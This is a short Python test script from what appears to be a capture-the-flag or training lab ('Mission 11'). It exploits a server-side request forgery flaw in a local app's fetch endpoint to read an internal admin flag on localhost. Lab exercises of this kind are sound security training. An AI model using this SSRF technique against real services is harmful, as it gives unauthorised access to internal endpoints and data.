import requests

BASE_URL = "http://127.0.0.1:8001/api/v1"

def test_mission_11():
    print("--- Testing Mission 11: The Core Breach (SSRF) ---")
    
    # Target internal endpoint discovery
    # Localhost scanning simulation
    target_internal = "http://127.0.0.1:8000/api/v1/internal/admin-flag"
    url = f"{BASE_URL}/fetch?url={target_internal}"
    
    print(f"[*] Fetching via SSRF portal: {url}")
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Response received: {data}")
            if "flag" in str(data):
                print("[!] SUCCESS: Flag recovered via SSRF!")
            else:
                print("[-] Flag not found in response content.")
        else:
            print(f"[-] FAILED. Status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    test_mission_11()
